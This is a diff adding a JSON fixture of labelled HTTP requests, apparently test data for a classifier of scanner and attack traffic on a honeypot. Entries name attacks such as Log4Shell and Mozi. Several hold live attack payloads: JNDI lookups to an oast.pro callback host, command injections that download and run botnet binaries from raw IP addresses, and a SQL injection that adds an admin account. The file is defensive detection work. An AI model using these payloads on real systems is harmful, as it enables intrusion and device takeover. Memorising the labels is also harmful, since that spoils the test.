@@ -1,0 +1,2222 @@
+[
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/?x=${jndi:ldap://${:-844}${:-629}.${hostName}.uri.d8f5ken6vsn4jicubocgwn8aot6rd5eng.d8eqqt76vsnamt6gpt00sddb7mt8dqhii.oast.pro/a}",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Log4Shell"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/geoserver/web/",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "GeoServer RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/SDK/webLanguage",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Hikvision RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/GponForm/diag_Form?images/",
+    "ua": "terrabot-owned-you",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "GPON Router RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/boaform/admin/formLogin",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0",
+    "body": "<cryptic binary>",
+    "expected_purpose": "rce",
+    "expected_name": "Fiberhome Router RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello",
+    "ua": "libredtail-http",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "ThinkPHP RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "ua": "libredtail-http",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "PHPUnit RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/?XDEBUG_SESSION_START=phpstorm",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Xdebug Remote Code Execution"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wp-content/uploads/index.php",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "PHP Shell in Uploads"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://139.135.46.123:55968/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Netgear Router RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x%27;%20INSERT%20INTO%20ampusers%20(username,%20password_sha1,%20deptname,%20sections)%20VALUES%20(%27z3r0%27,%20%277e41da4d7826703ce5176ec69b8b8c59900ae7f5%27,%20%27none%27,%20%27*%27);%20--%20-",
+    "ua": "python-urllib3/2.7.0",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "FreePBX Endpoint RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/GponForm/diag_Form?images/",
+    "ua": "Hello, World",
+    "body": "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://112.239.113.8:54964/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0",
+    "expected_purpose": "rce",
+    "expected_name": "Mozi Botnet / GPON"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "${jndi:ldap://${:-844}${:-629}.${hostName}.useragent.d8f5ken6vsn4jicubocg1dynj4kmuzkkh.d8eqqt76vsnamt6gpt00sddb7mt8dqhii.oast.pro}",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Apache Log4j (Header Injection)"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/_ignition/execute-solution",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Laravel Debug Mode RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/tomcatwar.jsp?pwd=jwd&cmd=curl",
+    "ua": "Go-http-client/1.1",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Spring4Shell"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/confluence/foo.action?rce=1",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Atlassian Confluence RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/autodiscover/autodiscover.json?@zdi/Powershell",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Exchange Autodiscover PowerShell Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.47/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$",
+    "ua": "terrabot-owned-you",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "CGI Shell Payload Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/cgi-bin/shortcut_telnet.cgi?cd%20/tmp%3Brm%20arm7%3Bwget%20http%3A//31.56.209.220/arm7%3Bchmod%20777%20*%3B./arm7%20gigasex",
+    "ua": "Hello World",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Command Injection Payload"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/xmlrpc.php?rsd",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "WordPress XML-RPC Brute Force"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/?rest_route=/wp/v2/users/",
+    "ua": "Mozilla/5.0 (l9scan/2.0.530323e2032323e2534323e2237313; +https://leakix.net)",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "WordPress User Enumeration"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wp-login.php",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "WordPress Login Brute Force"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wp-json/gravitysmtp/v1/tests/mock-data",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.1 (KHTML like Gecko) Version/7.0.6 Safari/537.78.1",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "GravitySMTP WordPress Plugin Data Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/phpmyadmin/",
+    "ua": "python-requests/2.32.5",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "phpMyAdmin Login Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/manager/html",
+    "ua": "python-requests/2.27.1",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Tomcat Manager Login"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/remote/login",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Fortinet SSL-VPN Login"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/dana-na/auth/url_default/welcome.cgi",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Pulse Secure VPN Login"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/+CSCOE+/logon.html",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Cisco AnyConnect VPN Login"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/owa/",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Microsoft Exchange OWA"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/sap/bc/ui2/flp",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "SAP Fiori Login"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/agent/vicidial.php",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "VICIdial Call Center"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.vscode/sftp.json",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "VSCode SFTP Credentials"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/dns-query?dns=ay4BAAABAAAAAAAAIDYxZDM2NTk0NWI1ZjExZjFhZDBiZmExNjNlNjlmYmZhDG9wZW5yZXNvbHZlcgZkbnNsYWICY24AABAAAQ",
+    "ua": "python-httpx/0.27.0",
+    "body": "",
+    "expected_purpose": "resource_discovery",
+    "expected_name": "DoH-Style DNS Query Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.cline/memory.json",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Cline Memory Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/root/.streamlit/secrets.toml",
+    "ua": "Mozilla/5.0 (compatible; silver.inc/2.0)",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Streamlit Secrets Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wp-config-sample.php",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "WordPress Sample Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/symfony/gcp_credentials.json-hotfix",
+    "ua": "curl/8.7.1",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "GCP Credentials Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/root/.openclaw/openclaw.json",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "OpenClaw Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.gcp/credentials.json",
+    "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Hidden Tool Config Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/api/.env/laravel/phpinfo",
+    "ua": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "API Secret Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ReportServer",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Microsoft SSRS"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/fpbx/recordings/index.php",
+    "ua": "Mozilla/5.0",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "FreePBX Recordings Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/admin/modules/fpbxphones/ajax.php?md5=91e45cdf13fdb23581203de8ca370064",
+    "ua": "python-requests/2.24.0",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "FreePBX Phone Provisioning Module Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/manager/text/list",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Tomcat Manager Text Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/recordings/",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "PBX Admin Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/developmentserver/metadatauploader",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Metadata Uploader Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wp-admin/css/colors/midnight/",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "WordPress Admin Surface Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/sito/wp-includes/wlwmanifest.xml",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "WordPress Manifest Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wp-includes/ID3/license.txt",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "WordPress Structure Discovery"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/wp-includes/css/buttons.css",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "WordPress Asset Discovery"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/currentsetting.htm",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Embedded Web UI Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/geoserver/index.html",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "GeoServer Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/api/v1/api-docs",
+    "ua": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "API Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/openapi.json",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "api_probe",
+    "expected_name": "Swagger/OpenAPI Documentation Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/cgi-bin/luci",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "OpenWrt LuCI Device Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/cgi-bin/getagent.cgi?type=s",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "CGI-Bin Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/api",
+    "ua": "python-requests/2.28.1",
+    "body": "<cryptic binary>",
+    "expected_purpose": "api_probe",
+    "expected_name": "API Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/HNAP1",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "D-Link HNAP Exploit"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ui/login.action",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Ubiquiti UniFi Login"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ISAPI/Security/userCheck",
+    "ua": "Mozilla/5.0",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Hikvision ISAPI Auth Check"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/sdk/index.php",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Dahua IP Camera SDK"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/cgi-bin/authLogin.cgi",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "QNAP NAS Login"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/evox/about",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Aruba Instant AP"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/ScadaBR/login.htm",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "ScadaBR SCADA Login"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/actuator/env",
+    "ua": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Spring Boot Actuator"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/containers/json",
+    "ua": "libredtail-http",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Docker API Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/docker-compose.override.yml",
+    "ua": "l9explore/1.2.2",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Docker Compose File Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/build.gradle",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Maven/Gradle Build File"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/magento_version",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Magento Version Disclosure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/nmaplowercheck1780427745",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "mass_scanner",
+    "expected_name": "Nmap HTTP Detection Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/robots.txt",
+    "ua": "Mozilla/5.0 (compatible; FreePBX-Scanner/1.0)",
+    "body": "",
+    "expected_purpose": "mass_scanner",
+    "expected_name": "FreePBX Scanner Bot"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "PROPFIND",
+    "path": "/",
+    "ua": "-",
+    "body": "",
+    "expected_purpose": "mass_scanner",
+    "expected_name": "WebDAV PROPFIND Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/index.php?lang=../../../../../../../../tmp/index1",
+    "ua": "libredtail-http",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "libredtail"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Shodan-Pull/1.0",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Shodan"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/robots.txt",
+    "ua": "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Censys"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Palo Alto Xpanse"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/",
+    "ua": "Rapid7/1.0 Project Sonar",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Rapid7 Project Sonar"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/",
+    "ua": "BinaryEdge/1.0",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "BinaryEdge"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.m2/settings.xml",
+    "ua": "l9explore/1.2.2",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "LeakIX"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/",
+    "ua": "ZoomEye-Spider/1.0",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "ZoomEye"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/",
+    "ua": "ExpanseBot/1.0",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Expanse"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Internet Measurement Research"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/",
+    "ua": "SecurityTrails/1.0",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "SecurityTrails"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/",
+    "ua": "RWTH Aachen University scanner",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "RWTH Aachen University"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/",
+    "ua": "Mozilla/5.0 (netcraft.com survey)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Netcraft"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "HTTP Banner Detection (https://security.ipip.net)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "IPip.net"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Infrawatch"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "145.LL|'|'|SGFJS2VKX0Q0OTKWNJI3|'|'|WIN-JNAPIER0859|'|'|JNAPIER|'|'|19-02-01|'|'||'|'|WIN",
+    "path": "7",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "malware_comm",
+    "expected_name": "NJRAT / AsyncRAT malware communication"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "POST",
+    "path": "/stratum",
+    "ua": "XMRIG/6.18.0",
+    "body": "{\"method\": \"login\", \"params\": {\"login\": \"wallet\"}}",
+    "expected_purpose": "crypto_mining",
+    "expected_name": "XMRig cryptocurrency miner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Odin"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/admin/modules/framework/amp_conf/htdocs/admin/config.php",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "FreePBX Config Disclosure Probe"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "GET",
+    "path": "/anthropic/v1/models",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "api_probe",
+    "expected_name": "Anthropic API Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "<cryptic binary>",
+    "path": "mstshash=zgrab",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Citrix NetScaler RDP Proxy / BlueKeep Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/solr/admin/cores?action=STATUS&wt=json",
+    "ua": "Go-http-client/1.1",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Apache Solr Fingerprinting"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/v2/_catalog",
+    "ua": "Go-http-client/1.1",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Exposed Docker Registry"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.gitlab-ci.yml",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "GitLab CI Configuration Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/aaa9",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "IoT Botnet Probe (aaa9)"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
